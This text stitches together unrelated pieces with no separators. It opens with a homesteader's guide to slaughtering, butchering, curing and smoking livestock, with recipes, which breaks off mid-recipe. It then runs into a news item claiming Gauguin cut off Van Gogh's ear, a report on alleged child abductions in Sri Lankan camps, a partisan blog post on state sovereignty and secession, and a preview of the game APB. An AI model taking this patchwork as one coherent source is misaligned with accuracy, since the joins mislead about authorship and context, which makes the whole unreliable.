After years and years of butchering I still feel a strong adrenaline rush when the animal is killed .
Be prepared for that and use it to make sure the death is as painless as possible .
A knowledgeable person can direct these strong feelings into doing the job right instead of letting their emotions get the best of them and botching the job .
When the temperature only reaches 40° during the day and the pasture is no longer adequate feed , it is time to butcher .
Sheep and goats should be nine months or under .
Pigs should be just slightly jowly .
Past wisdom dictated that 250 pounds was optimum butchering weight for a pig , but after your porkers reach 225 , the ratio of weight gain going to fat versus lean meat increases dramatically .
After many years of experimentation , I try for 200 pounds .
At that point my pigs have no more of a fat covering than my goats .
There ’s still enough fat for lard and sausage , but there ’s no reason to pour more and more feed into them only to find their kidneys so imbedded in fat that they ’re hard to locate .
I buy my pigs in early May and by mid-November they are eating so voraciously that I know it can no longer be practical to keep them .
Figure 1 . Cutting around the foot .
Calves are traditionally kept until they are 10 - 15 months old , but that can be a problem for a family raising their own meat .
If the calf was born in February it could be butchered in December .
In a place like Montana , however , December is late for butchering .
With the temperatures around 0° , your meat would have to hang a very long time to age .
If you decided to keep the calf till spring , you would be faced with deciding whether to butcher it after feeding all winter or to let it grow some on the pasture .
By the time the calf is looking really big , it ’s midsummer .
In a cool climate you could butcher it then if you did it fast , but you would have to pay someone to hang it to age .
In most climates , you do n’t butcher between May and October anyway , if you can help it , because of the fly problem .
So then you ’re up to fall when you have all the other butchering to do .
If you can manage it , I think that is your best option .
Here are a few additional suggestions to think about ahead of time .
Butchering pigs and cows is easier if you withhold food for 24 hours before butchering .
This is not totally necessary , and if you would feel bad having your animal hungry on its last day , do n’t do it .
Just be extra careful with the guts .
When you butcher only certain members of a herd , avoid frightening the others .
Do n’t run through the herd chasing the one you want .
Move slowly and calmly .
Try not to kill one animal in front of the others .
Do n’t slaughter in the animal ’s home .
Figure 2 . Cutting down the body .
The exception to this is when you are slaughtering pigs .
Swine do not care if you kill their companion and will rush over to drink the blood if they can .
It makes sense to leave the pig butchering until last so that they can consume anything that is left over .
Do n’t feed surplus fat to pigs , though .
Only poultry can convert fat into useable production calories .
That is because of their high rate of metabolism .
If you feed fat to pigs , it will provide calories , but it can only become fat , not meat .
Before butchering , decide what parts you will save .
I think I ’ve tried saving just about everything , and I think there ’s some value in that .
However , if no one wants to eat it , the value is only in learning and experimenting and knowing the possibilities .
There is a certain satisfaction in using everything .
Ears and tail can flavor a pot of beans .
Hooves can make gelatin .
Stomachs can hold blood sausage and other things .
Lungs are edible .
Intestines can be used to make sausage casings or cooked in some other additional dishes .
I will describe what I keep , but feel free to make your own decisions about what you and your family would like to try .
A word about using the intestines for sausage .
If the situation is such that you have running water in a hose , it is fairly easy to clean them .
Otherwise you ’ll have to do it indoors , which is a lot of work .
After that you have to turn them inside out and scrape them .
If you do n’t scrape them , they ’ll still be edible but they ’ll be tougher than you might like .
These days I feed the intestines to the animals and buy prepared ones .
If you buy them from a butcher house , they ’re already prepared and quite inexpensive .
Try not to buy them in the grocery store , as they demand ridiculous prices .
Be sure to save enough fat for lard , sausage making , and if you ’re butchering a cow , for ground beef .
A goat is shot in the back of the head .
The front is too hard .
With a cow or a pig , mentally draw lines from the top of each ear to the opposite eye .
Where the lines cross is where you shoot .
One shot with a . 22 should do it .
Figure 3 . Skinning from the center .
We shoot pigs in their pen .
That is the least traumatic for everyone .
If you do this , though , you ’ll want to get the pig out of the pen as quickly as possible so as to slit the throat on clean ground .
Throw a noose around its neck and drag it out .
You want to slit the throat while the heart is still beating in order to get all the blood pumped out .
Stick the point of your big knife into the throat and cut outward through the skin .
Never try to cut into the skin through the hair .
Make sure you ’ve severed the main veins and arteries .
Any male animal that is to be used as food should have been castrated .
If that was n’t done , however , remove the head and testicles right away .
That ’s easy with a goat , but a cow or pig can kick with a real wallop , so be careful .
This is done so the meat wo n’t be tainted .
If you are butchering a pig , you will want to wash it down now .
A pig is a clean animal in a natural environment but gets pretty dirty when confined .
Be especially careful in cleaning the rear feet , for they ’ll stay on unskinned .
Remove the head by cutting all the way around with your big knife .
As always , avoid cutting into the hair .
Instead keep your knife between the flesh and the skin and cut out .
With a goat , twist the head until the bone snaps .
With a pig or cow , use your meat saw .
Make slits between the achilles tendon and the ankles and insert the gambrel .
At this point , you could scald a pig but in these days of preserving meat by freezing , there ’s really no point .
In days past , the skin was left on the bacon and hams to protect them .
It ’s traditional , but there ’s no other reason to leave it on since we do n’t eat it anyway .
And logistically it ’s just much simpler to skin .
Remove front feet at the joint .
Using a pulley for a goat and a come - along for a pig or cow , hoist the animal into the air to a height convenient for working on the rear of the animal .
Slip your short pointed knife ( Figure 1 ) into the slit you made at the achilles tendon and cut around the foot , again cutting out , not in .
Be very careful not to cut the tendon .
With the knife between the flesh and the skin , slice a line through the skin down each leg to the centerline .
Then cut down the body to the neck ( Figure 2 ) .
Figure 4 . Skinning the foreleg .
Now take your skinning knife and begin skinning at the junction where the leg cuts meet the centerline .
Hold the skin with one hand or your hook and pull hard to create tension as you use your knife to separate the flesh from the skin .
Work out from the center ( Figure 3 ) .
If you are not going to use the hide , you wo n’t have to worry about keeping it intact .
Just be concerned about the meat in that case .
You ’ll have to be much more careful if you want to use the hide .
Keep pulling the skin away with your hand or the hook and continue to slice between the hide and the flesh until the belly is skinned .
This will relieve the tension of the skin on the rump .
Now work around the leg from front to back .
The next step is to start at the top of the “ Y ” and skin up and over the crotch .
The skin is tightest here , so be especially careful if you ’re saving the hide .
Pull skin out and down to create tension on your work while you slice with your knife .
A layer of fat makes the animal relatively easy to skin .
Leave as much fat on the body as possible .
Work over the anus to the tailbone .
Give the tail a sharp jerk and it will separate from the vertebrae .
From here on , the weight of the skin practically skins the animal for you .
Work all around the body .
If there is too much movement on the gambrel , lean against the animal .
Raise the beast when it becomes difficult to reach your work .
Bring the work to you and stay comfortable .
The forelegs are a bit difficult near the shoulders .
Start on the outside of the leg ( Figure 4 ) .
Work around to the front .
Skin the neck and the inner forelegs and shed the skin .
Lower the animal so that you can comfortably work on the rear of it .
At this point you want to separate the large intestine from the body .
You will begin by cutting around the anus with your short pointed knife .
Be careful not to make any holes in the intestine .
When it is cut free , pull it slightly out and tie it off .
It is helpful to have a partner here .
This step ( tying ) is unnecessary if you are butchering a goat .
Figure 5 . Cutting down the belly .
Cut down the belly with your pointed knife .
Cut from inside out as before .
With your other hand hold the guts away from the point of the knife ( Figure 5 ) .
Cut through the belly fat all the way down to the sternum .
Next , cut the meat between the legs .
If the animal is a male , cut out the penis .
Place a large container underneath to catch the guts .
By now they will be bulging out of the body .
At some point if you are butchering a ruminant , there may be a flow of greenish liquid from the neck .
This is just the cud and nothing to worry about .
Cut through the fat surrounding the guts , then sever any tissue connecting them to the rear wall of the body cavity .
Pull the anus through to the inside and then out .
Separating the intestines from the body is tedious , so take your time .
You do n’t want to spill the contents into the meat .
Be careful also not to rupture the bladder .
Some people tie it and then cut it off , but I ’ve found that method to be more likely to cause spillage .
Pull the intestines and bladder out of the body .
Most of the stomach will also be free now .
You will need to reach in and under to lift it all over the sternum .
Some people cut through the sternum , but it ’s easy enough just to lift the guts out .
Most everything will now be hanging out of the body .
Strip away as much of the surrounding belly fat as you can to feed to the chickens .
Get out the bowl for the innards you want to keep .
Remove the kidneys and fat .
Cut out the liver and put it into the keeper bowl along with the kidneys .
Sever the remaining flesh connecting the stomachs to the body , and it should all fall into the gut bucket .
Figure 6 . A goat ready to cut up .
Cut out the diaphragm and remove the lungs and heart by severing the connective tissue behind them .
Separate the heart from the lungs and squeeze out the blood from the heart .
The heart is a keeper , while the lungs are n’t .
From the neck end , cut out the windpipe .
Be sure the opening is clear all the way through the body cavity .
Clean all over with cold water .
( Now you see that if you had n’t cleaned those rear feet of a pig , the dirt from them could contaminate the meat . )
Except for pork , we age all our meat from fowl to cow , and strongly advise you to do the same .
Pork should only hang overnight to chill , and all meat should be cut up in a chilled state .
A goat should age one week in 40° weather , longer in colder weather .
If it ’s too warm to age it , it ’s a real shame to butcher at that time , because the meat wo n’t be as tender as it could be .
A goat is hung whole .
To halve a larger carcass , face the belly while your partner helps hold the body and helps to guide the saw from the back when necessary .
Use your fingertips on the blade to guide your cut .
A cow should be quartered for ease of handling , of course , but also to allow the meat to cool as quickly as possible .
Merely cut between the 2nd and 3rd ribs and be ready to hold the fore section .
It should be hung for two weeks under the proper conditions .
When you ’re finished working on the animal ’s body , it ’s time to salvage the tongue and brains from the head .
The easiest way to get the tongue is to cut under the jaw in the soft space in the middle .
When you have slit this open , reach in and cut the tongue loose from its mooring .
Working through the mouth is much harder .
Chopping the skull with an axe works for getting out the brains , but sawing it in half with your meat saw gets the job done with a bit more finesse .
If you plan to use the rest of the head , you will have to skin it now .
Remove the ears , eyes , nose and anything that does n’t look like meat or bone .
Clean thoroughly .
You may want to brush the teeth .
You could make goat ’s head soup or you could make headcheese .
The only heads I use these days are pigs .
Some people use the jowls for bacon , but if you ’ve butchered before the pig has gotten really fat , there wo n’t be much there .
I use the head meat for scrapple , tamale meat and pozole .
I used to use some in liverwurst , but we prefer these other dishes .
In any case , you ’ll need a pot large enough to hold the head .
If you cook with a wood stove as I do , just add water to cover , put a lid on and leave it on the stove to simmer until the meat is tender .
It ’s less convenient if you use some other kind of fuel .
Figure 7 .
Separating the rear third of a pig .
Remove the meat and bones from the pot and separate them .
Take out anything that looks strange and you ’re ready to use whatever recipes you ’ve decided on .
Boil down your broth to a manageable amount and either use it in your recipes or freeze it for later use .
When you are ready to cut up your meat , refer to the section that applies to your animal .
Cutting up a deer or a sheep is the same as a goat .
Cutting up a goat
Cut behind the shoulder blades to remove the front legs .
Cut off leg at elbow .
These lower legs can be soup bones , but they ’re not much good for anything else .
You can package the shoulder as it is or you can bone it , roll and tie for a rolled roast .
You could also cut it up for stew meat .
Take as much meat from the neck as you can .
Use that for soup .
You could cut chops if you wanted .
You would have to saw through the backbone between every rib to do that .
You could bone out the chops to avoid all the sawing .
Or you could just cut out the whole muscle bundle along the backbone .
It ’s called the backscrap and is the best meat on the animal ( that ’s what I do ) .
Figure 8 .
Separating the front third of a pig .
Next take your meat saw and cut the ribs from the backbone .
Then cut them in half with your knife for easy packaging .
Underneath the backbone is the tenderloin .
Cut that out .
Now for the rear third .
Cut off the foot .
Next cut off the leg at the knee .
These are your shanks .
Separate the legs at the pelvis .
These are the only roasts I keep from a goat .
I use the front shoulders for stew or stir fry .
You can package the leg as it is or bone it .
Boning saves a lot of space and a rolled roast is a pleasure to cut when it ’s cooked , too .
That ’s it except for working over all the bones to retrieve any last bits of meat for your sausage bucket .
I save one goat just for sausage and one for jerky .
You may want to do that , or you may have other favorite uses .
Goat meat ( or chevon as it ’s called ) is really wonderful when it ’s properly handled .
Cutting up a pig
There are many ways to cut up a pig and many ways to cure meat .
I ’m going to tell you how I do it and why I use this method .
If you ’re doing your own curing , you have the vagaries of weather to contend with .
Below freezing and it does n’t cure .
Fifty degrees and it spoils .
In my first experiments I used an old fashioned cure .
It was very salty .
The hams and bacon hung in a cool room all year and did n’t spoil .
If you do n’t have a freezer , you could do that .
You can use a dry cure or a brine cure .
In the brine cure , the strength of the brine is determined by the amount of meat .
Theoretically it ca n’t get too salty that way , and I have found that to be true .
If you butcher when it ’s 40° , and then it warms up to the 50s , then it freezes for a while , then warms up to 50° again , there ’s a real danger that your meat will sour around the bone .
By the time it ’s in the warm smokehouse , you ’ve really got trouble .
For this reason I bone the hams .
I have never had a problem since I began doing this .
Also it makes the ham nice to cut when it ’s rolled and tied .
Figure 9 .
Separating the ribs from the chops .
Your pig should have hung overnight so that the meat is firm .
Now you will want to cut your side of pork into thirds .
To do this take your meat saw and cut straight down from the backbone through the aitch bone to separate the rear ham from the body .
( Blue tape , Figure 7 . )
The cut should go right through the ball and socket joint .
Remove the foot .
To separate the front third , cut between the second and third ribs again cutting straight down from the backbone .
( Blue tape , Figure 8 . )
Look carefully at the muscle bundles and try to keep them intact .
Take the middle section and make another cut after the 11th rib .
Then cut across the ribs parallel to the backbone to separate the ribs from the chops .
( Blue tape , Figure 9 . )
Look at both ends of the meat to see where to cut .
Remove the belly fat and save it for sausage and lard .
Saw through the backbone for chops and finish your cuts with a knife .
It ’s helpful to have a partner to hold it steady .
Trim off the extra fat but as always , leave some .
Now trim out the loin .
Feel the bone with your fingers and just cut out the muscle bundle as well as you can .
This is your best roast .
Cut it into whatever size you want ( Figure 10 ) .
Figure 10 .
Rolled poark roasts and the bone they came from .
Trim the excess fat from the ribs .
Decide whether you want extra meaty ribs or if you want to slice off most of the meat for bacon .
Cut the bacon from the ribs ( Figure 11 ) .
Cut the ribs into easily packaged pieces , but leave the bacon whole until after smoking ( Figure 12 ) .
Before cutting your hams , you ’ll have to decide whether you want them large or small and how much meat you want for sausage , stir fry , etc .
Cutting hams and roasts takes some practice , but do n’t worry too much .
They can always be trimmed to look nice and nothing is wasted .
It can always go into the sausage bucket .
Begin two piles of trimmings .
One will be for sausage and the other will be better pieces for stir fry .
Take the front third and cut off the hock .
If you wanted to make this a shoulder roast you could , but the meat is very fatty and not as good quality as the rear .
It could also be used for sausage or stir fry .
When you make your roasts , study the muscle bundles and try to keep them intact as much as possible .
To bone , cut to the bone and cut around it as well as possible and along the backbone to the third rib .
Cut off the front muscle bundle and put it into the sausage bucket .
Roll it up as it would be with the bone in and trim it to look nice .
Trim off excess fat .
Take the rear third and decide how much hock you want and cut that off .
Bone out the rear hams and trim off excess fat .
This is tedious , so just take your time .
Make your cut in to the bone and cut it out as well as possible .
Trim end for looks ( Figure 13 ) .
Figure 11 .
The bacon separated from the ribs .
Put your bacon , hams and hocks into the curing bucket .
Be sure to save enough fat for sausage and lard , and you ’re finished with this part .
Cutting up a cow
Begin with the hind quarter .
Cut off the leg by making a cut with the meat saw from the hip to the tailbone .
If you cut across the top , you will have round steaks .
The first cuts are top round and are the best .
Thicker cuts make round roasts .
The small , less meaty part near the shank is the heel of round .
The shank is a soup bone .
The muscle flap on the belly is the flank steak .
Cut that off and remove the layers of fat .
The rump roast is the meaty end that was cut away from the leg .
Bone it out for a rump roast or just cut it off with the saw .
Figure 12 .
A pig cut up but not yet boned ( front )
The top muscle on the remaining piece is all steak .
You could cut through the backbone for each steak or bone it out and then cut into steaks .
Or the part behind the ribs could be left whole for a sirloin roast .
The meat underneath the backbone is the tenderloin or filet mignon which can be removed and cut into steaks ( butterfly ) or left whole .
Your steaks , beginning at the rear just ahead of the rump roast and moving forward , are sirloin , porterhouse , T - bone , if boned , separate into the filet mignon and New York strip .
The rib steaks could be left whole for a rib roast , which would be your best roast .
Everything left on this quarter is stew or burger .
Stew meat is the better meat .
Remove the fat and anything un -meatlike .
Now we ’re ready for the front quarter .
To remove the leg , lift it up and start cutting underneath until you have cut behind the shoulder blade and separated the leg from the body .
The part on the shoulder is called a blade roast .
It can be boned or just cut with the saw to the size you prefer .
The top part of the leg is chuck and can be made into roasts or steaks .
It can be boned or not .
The lower part of the leg is burger or soup bone .
There are probably a couple of rib steaks on the remaining piece , so cut these out .
The neck meat is stew .
The meat at the front that would have been just behind the leg is brisket .
Remove that from its bone .
Figure 13 .
Roasts , hams , chops , bacon , ribs & sausage trimmings .
Cut as many ribs as you want for short ribs .
Everything else is stew or burger .
When making hamburger , use at least one fourth fat .
Curing
Mix the brine before you cut up your pork , so you can just drop it right in .
Two five - gallon buckets of food grade plastic works fine for two pigs .
The recipe is for 100 lbs. of meat which should also be right for two pigs .
Measure out 8 pounds of pickling salt and 2 pounds of sugar , honey , brown sugar or maple syrup .
This is the critical part .
Dissolve this in water .
We add other spices such as cayenne , black pepper , garlic , etc . but this is only for added flavor and not necessary .
The use of boiling water aids in dissolution .
Some people add saltpeter ( nitrates ) , but all it does is make the meat a uniform pink , and I prefer not to use this additive .
Bacon and hocks will cure in a week at 40° .
Hams will take six weeks .
For every day below freezing , another day should be added .
Weight the meat so it does n’t come above the brine , adding more water if necessary .
Use a plate with a clean rock on top .
Figure 14 .
Cuts of meat from a pig .
Sausage
Any kind of meat can be used for sausage .
Just save whatever scraps you have from cutting up meat .
You can use as little as ¼ fat , but the sausage is much , much better if 1/3 is used .
Sausage making is one of the most fun of all my projects .
But do n’t rush through it or it can turn into a nightmare .
If you ’ve just finished cutting up your pig , give yourself a break and wait until the next day to do the sausage .
I have enclosed several recipes that you might like to try .
We like to make many different kinds each year .
Whatever you do though , take the time to cook some of each type before you package it or stuff it into casings .
It may be too bland or worse too spicy , in which case you ’ll have to add more meat .
If sausage is being made from pork , only one grinding will suffice but beef or goat should be ground twice using a coarser grind the first time .
Figure 15 .
Cuts of meat from a cow
Some recipes call for water and some do n’t , but if you ’re making link sausage you will have to add some liquid .
Add enough so that the sausage is easy to work .
Smoking
Hardwood must be used for smoking so that the meat does n’t get resins in it , as it would from pine .
When smoking hams , bacon and sausage , you use what is called a cool smoke .
This means that the meat is not being cooked while it is being smoked .
You can use anything to hold the meat and smoke .
We built a smokehouse out of sheets of plywood , which enables us to walk inside to hang the meat .
We use an old woodstove to provide the smoke , which passes from the stove through a stovepipe with damper into the smokehouse .
The pipe should go in fairly low , but not so low as to inhibit draw .
For an hour or so , leave the door ajar to let excess moisture escape .
Then close it and try to keep the temperature around 100° .
When it ’s done is a judgement call , but we give sausage approximately 12 hours , bacon 14 , and hams 48 .
The color is the key .
It should be the color of mahogany .
Recipes
Scrapple : basic recipe
By weight :
4 parts meat ( ground or chopped )
3 parts broth
1 part cereal
Cornmeal is traditional , but oatmeal is sometimes used , as is buckwheat flour .
Some people use half cornmeal and half buckwheat flour , while others substitute a little wheat germ for some of the cornmeal .
If using cornmeal , add some cool broth first to keep the cornmeal from lumping up .
Then cook with the rest of the broth and the meat until it begins to thicken .
Stir often and do n’t let it scorch .
At this point add the seasoning .
Use whatever you like and leave the rest .
The amounts given below are about right for the meat from one head ( or about 8 lbs ) :
2 Tbsp. salt
2 Tbsp. pepper
1 Tbsp. marjoram
1 Tbsp. sage
1 tsp. cayenne
½ Tbsp. nutmeg
Trace of mace
2 Tbsp. onion ( ground or chopped )
½ tsp. thyme
1 bay leaf
Pour into a lightly oiled loaf pan and chill .
Turn out , cut to appropriate size , wrap and freeze .
When ready to cook , slice and fry until brown outside but still soft inside .
Scrapple is traditionally served with maple syrup .
The cereal - to - broth ratio needs to be pretty constant , but you can use more or less meat .
Pozole ( poh - so - lay )
Meat from 1 head , chopped
( about 8 lbs )
Broth to cover
4 lbs hominy
2 Tbsp. salt
4 Tbsp. chili powder
Cook 2 or 3 hours .
When ready to eat , chop or shred cabbage , onions , and radishes and place in separate bowls .
To serve , ladle soup into bowls and top with the desired raw vegetables .
Squeeze lime juice over all .
Tamales
Take the head meat and add cumin , crushed garlic , chopped hot peppers to make a nice spicy mixture .
Eat or freeze .
Preparation : Traditionally , tamales are wrapped in corn husks .
That ’s fine if it ’s summer ( if they ’re dry , soak them to make them pliable ) .
If corn husks are not available , there are plenty of other wrappers to choose from .
I go to the garden to see what ’s available cabbage leaves , chard , even lettuce .
Even in the depths of winter I have something under straw that will do .
The advantage is that the whole thing can be eaten .
Make the outer covering of cornmeal ( I like to use masa ) with some lard worked in and then add some water ( like making biscuits ) .
Add some garlic , cumin and cayenne and spread onto the wrapper .
Roll up and steam for about two hours and serve .
Sausage : A few basic recipes
As you can see , the amounts of the various seasonings are really arbitrary .
Feel free to add more or less according to what you like .
Salt is really a matter of preference if the sausage is going to be frozen .
Most recipes call for 2 Tbsp. to 6 Tbsp. for 10 lbs , but I prefer to stick with 2 Tbsp .
If you like variety , try several recipes , but if you just want to get it done , go for the recipe for 100 lbs .
Pork , beef and chevon can all be used in sausage .
Chevon can be substituted in any recipe calling for game or beef .
For smoked sausage , increase salt to 2 lbs per 100 lbs meat and add 3 - 5 % water , or enough to make the sausage easy to handle .
Basic country sausage
10 lbs meat
2 Tbsp. salt
4 tsp. sage
4 tsp. pepper

The battle of Van Gogh 's ear : Artist did n't chop it off - Gauguin attacked him in brothel row over woman
Self - portrait : Vincent Van
Gogh never spoke about the cause of his missing ear , but it is claimed rival Paul Gauguin chopped it off outside a brothel
History has always painted Vincent Van Gogh as the artist who cut off his ear .
But according to researchers , history might have got the wrong man .
They believe that , in fact , it was Paul Gauguin , an artist of almost equal renown , who cut off his friend 's ear .
And the injury was n't inflicted for the sake of art - rather it was part of a feud over a prostitute .
This theory is the masterpiece of German historians who have pored over the evidence for ten years .
They believe the story about the self - inflicted wound was invented by the sword - wielding Gauguin just to protect himself .
What is not disputed is that Van Gogh lost his ear when the two artists were living in the South of France in December 1888 .
The Dutch painter , who travelled to France after teaching himself to draw , was attempting to set up an artists ' retreat .
The two were known to fight about art .
Van Gogh believed an artist should paint what he saw , while Gauguin painted according to his memory .
But on this occasion , they were fighting over a prostitute named Rachel , outside the brothel where she worked , the book says .
Paul Gauguin , pictured , cut off Van Gogh 's ear , says Hans Kaufmann of Hamburg University
Hans Kaufmann , of Hamburg University , said : ' To get rid of Van Gogh , who was begging him to stay [ in the south of France ] Gauguin waved his weapon in the direction of the victim while they were in front of the house of ill repute .
' The left ear fell .
We can not say if it was deliberate or an accident .
In this situation , the protagonists vowed to keep silent .
Then Gauguin disappeared , abandoning his friend .
' The next day , the police questioned Gauguin .
That 's when he made up the theory about self - mutilation . '
Van Gogh , in bed , did not give the police any information .
But he was so upset by the abandonment , the book says , that he shot himself in the chest seven months later , and died , at 37 .
He may have been suffering from lead poisoning from the paints he used .
The academics say the accepted theory that Van Gogh cut off his own ear is based entirely on Gauguin 's story .
Van Gogh never talked about it .
' Subsequent behaviour and numerous allusions by the protagonists suggest they were hiding the truth , ' Mr Kaufmann told French newspaper Le Figaro .
One of Van Gogh 's most famous pieces , Starry Night , which inspired a song by Don McLean
If the truth had come out , Gauguin could have faced prison , whereas Van Gogh 's retreat would never have been closed , the academics added .
Gauguin is said to have thrown his sword into the River Rhone out of remorse .
Neither the sword nor the razor Van Gogh is said to have used to cut himself were found .
There have been many theories about how Van Gogh lost his ear .
Some blame his descent into mental illness , others the breakdown of his friendship with Gauguin .
But before now , they have never disputed that it was self - inflicted .
Fighting displaced at least a quarter of a million Tamils , the UN says A number of children in camps for people displaced by Sri Lanka 's conflict have been abducted , international human rights groups say .
The groups say they have verified reports of disappearances in the Vavuniya area and are calling for the United Nations to investigate .
Suspected former Tamil Tiger child soldiers are said to have been removed by paramilitaries for questioning .
A Sri Lankan military spokesman denied the groups ' allegations .
A spokeswoman for the groups , Charu Lata Hogg , said the motives for the abductions were unclear but some children were being questioned about alleged links to the Tamil Tiger rebels , or LTTE ( Liberation Tigers of Tamil Eelam ) .
Tens of thousands of children were among those displaced in the recent fighting , many finding themselves in government - run refugee camps .
On Tuesday , Sri Lankan President Mahinda Rajapaksa declared the country " liberated " from Tamil Tiger rebels after a 26 - year war .
He spoke after the army reported the death of rebel leader Velupillai Prabhakaran and the capture of the last pocket of territory held by the Tigers .
' Kidnapped for ransom '
The Coalition to Stop the Use of Child Soldiers is an umbrella group of global organisations which includes Amnesty International and Human Rights Watch .
It said it had received verified reports of abductions from camps in and around Vavuniya in the north .
It alleges that groups like the EPDP , PLOTE and the TMVP - Karuna faction - all Tamil paramilitary groups affiliated to the government - have unfettered access to the camps despite the presence of the Sri Lankan military .
" The motive is slightly unclear , " said Ms Hogg .
" Some are being taken away for ransom , they 've been kidnapped for ransom , and there 've been certain negotiated releases where mothers had some jewellery and they could negotiate a release right within the camp .
" In other cases the children have been taken away for questioning for their alleged links to the LTTE , so they are suspected of being former child soldiers with the LTTE . "
She says there are fears for the safety of former LTTE child soldiers , who should be protected under international agreements .
Sri Lanka 's military denied the allegations , describing them as yet another attempt to discredit the government .
Military spokesman Udaya Nanayakkara said it was impossible for " anyone , even a child or an LTTE person , to be taken out from the camps without any proper or legal authority " .
The coalition says the protection of children in the north and east of Sri Lanka is a matter of urgent concern , citing the refusal of access to international agencies responsible for monitoring the camps .
Without independent scrutiny , it says , children are at risk of human rights abuses , arbitrary detention and enforced disappearance .

December 29 , 1860 a resolution was passed in Charleston , South Carolina .
It laid out the reasons for which the legislature was determined to dissolve the legal bonds which bound the state to the United States .
There is still a debate over many things , the primary contention still is the ‘ true reason ’ for secession .
Die hard believers still say the issue was ‘ States Rights ” .
Opponents still ask the question : States rights to do what ?
In this they are casting the accusation of Slavery .
In retrospect there is really not much debate , regardless of the noble intent of some , the bulk of the leaders were slavery proponents , and they were the driving force behind the secession and the war .
That is the muddied history which still clings to very word ‘ Secession ’ .
The war fought and won by President Abraham Lincoln would seem to have settled the issue of the right of States to secede from the Union .
If that is the case , then why have so many states begun the process of passing State Sovereignty , or Tenth Amendment Resolutions ?
The last several decades have seen a steady and almost unstoppable trend toward increasing centralization of power in DC , at the expense of the states , and individual liberty .
Recently there was a stunning landmark which passed with little notice .
An article in USA Today documented a change in funding for states .
The largest source of revenue for most states is now the Federal Government .
We are rapidly heading to a point of no return .
The DC Government will continue to expand programs , offering limited term financing for them .
As the federal funding goes away , states will be forced to increase taxes on their residents to replace the DC dollars which have evaporated .
They will turn to DC for more funds , giving away more and more control as they accept increasing federal funding for day to day operations .
Once the states are completely dependent upon the DC government for revenue they will no longer be functional as separate government units .
At that point we will effectively have the end of the United States , total replacement with a monolithic federal unit dominated by a central government .
This will complete the process begun with the 17th amendment .
The states are being made irrelevant by design .
The founding premise , of Federalism is a notion relegated to obsolete textbooks , and most Americans have never even heard of the concept .
Principles of subsidiarity are non existent in our nation .
The ideas of Federalism , local rule , and self reliance have been replaced by a culture of dependence and Big Government control and reliance on The State to provide all .
It may be too late , but somehow some of the states are taking stock and beginning to realize if nothing is done , the country will be altered permanently .
At this time , more than thirty states have such State Sovereignty resolutions in process .
The Tenth Amendment Center has a clearinghouse for information on the progress in various states .
The big question that needs to be asked is this :
Once a state passes such a resolution what happens when the inevitable conflict arises .
Just how strongly will the states fight to protect their rights ?
And just how strongly will DC assert its powers ?
Will this become a new war , fought in the courts ?
Or will we see another brutal conflict , with states joining together against a federal government intent on maintaining a union by all means necessary , including force ?
A potential wild card is the movement toward a new Constitutional Convention .
At this point we are roughly two states short of the threshold required to call a convention to rewrite the Constitution .
Should that happen , all bets are off .
I would bet that the current members of Congress , the lords of the two party system will do anything necessary to prevent such a thing from happening .
Perhaps that ’s a weak point .
It is interesting to see some of the maneuvering taking place recently .
Several states have taken aim directly at the DC government ’s infringement of Second Amendment rights .
Alaska , Montana and Texas have passed or introduced state gun rights bills , which assert that any federal regulations are invalid within the borders of the state so long as the manufacturing and sale of said items remains exclusively within the state .
This is a direct challenge to the many tentacles the DC government has extended via the expansive interpretation of the ‘ Commerce Clause ’ .
There is little question , should any of these bills become state law that there will be swift action to challenge them in federal jurisdiction .
As more states get on the same side , the media will be less able to characterize them as extremists
Ride fast and shoot straight has numbers and info on the growing movement .
As you can see there is a large and growing sentiment among the various states .
As more and more join , this will be perceived as mainstream , making it difficult for the media to describe all adherents as fringe elements .
We need to move on all fronts , using everything at our disposal to press the issue and to regain control of our government from the entrenched party structure that has simply bent government to serve their wishes instead of the goals of the Constitution .
Much work needs to be done , but it is beginning to look just a little bit less daunting as more join the fray .
Keep the Faith
The Rev
Of everything I saw at E3 , APB stood out as the project with the greatest concentration of inspiration .
Ignore the surprisingly crappy images that have been released so far – this one deserves your attention .
During the presentation a colleague sat next to me leant in and said , “ Bloody hell . ”
A minute or so later I replied , “ This is the first original idea I ’ve seen all week . ”
It ’s very easy to think of APB as an online GTA .
It certainly is a game focused around either committing or preventing crimes in an open city .
But what makes APB stand out is just how damned smart it is .
Let ’s begin with the trailer .
Many games boast of being “ fully customisable ” , by which they mean you can choose whether your avatar is male or female , and maybe what colour hat you wear .
APB is something quite different .
And it only begins with character customisation .
A lot of the games shown at the conference boasted of their character designing tools .
Each and every one of them needed to take a trip to Realtime Worlds ’ private room in order to learn quite how far behind they really are .
You may remember last year ’s teaser for this that showed some of the options , with the gag reveals of various game developers created spookily accurately in the tool – it ’s here .
This year we were shown this in far more detail , of which a truncated version was shown on the EA stage , presented by Paul Barnett , and dodgily videoed :
Unfortunately not revealed on that occasion was the final punchline in the extended video we were shown – a character designed to look so uncannily like President Obama that it could well have been a stylised photograph .
What you also ca n’t see above is quite how ludicrously complex the tool really is .
When you change a detail , like someone ’s weight , it ’s also changing the skeletal structure underneath .
By having the device follow anatomical rules , you ’re not able to create faces that end up looking un -human .
Instead the bones underneath will adapt to keep things looking natural .
But shape is n’t all you can adjust .
How about the volume of body hair ?
The skin pigmentation ( rather than the more common choice of five or six race archetypes , here the skin pigments are accurate recreated , creating skin colours that look natural and extraordinarily varied ) .
Or how about the protrusion of veins ?
Even that detail is available for tweaking , in case you want to have your Angelina Jolie be as precise as possible .
Then there ’s make up , contact lens colours …
As Barnett comments in the video above , it seems possible to never get around to playing the game itself .
Further delaying your start , as the video above shows , the customisation goes beyond being able to create characters so distinct and recognisable that they ’re not going to bother with names floating above players ’ heads – you ’ll know someone when you see them .
It also extends to tattoos , decals , clothes and vehicles .
Creating designs in another in - game tool is so elaborate it looks like it should be its own £ 400 art software .
Then with your created work , you can apply it as a skin tattoo , which will automatically absorb the pigmentation of the skin to which it ’s applied , and adjust accordingly .
It will naturally wrap itself around the part of the body to which it ’s applied .
Or perhaps you ’d rather add it to clothing , where once again it is manipulated to look natural on the material to which it ’s applied .
Maybe you want it on your car – this time it will take on the sheen or shine of the vehicle , again appropriately wrapping itself to where you stick it , intelligently cutting itself off so it does n’t obscure windows , windscreens , etc .
You can then customise your vehicle , switch out body parts , wheels , even the in - car stereo .
This is beginning to sound like one of those late night infomercials where they presenter cries out , “ BUT WAIT !
THERE’S MORE ! ”
It does n’t stop there .
As Realtime Worlds ’ founder Dave Jones explained , as they develop the game they keep thinking of other things that the player would prefer to be in control of .
Which includes the music .
So there ’s a complete music creation tool in there .
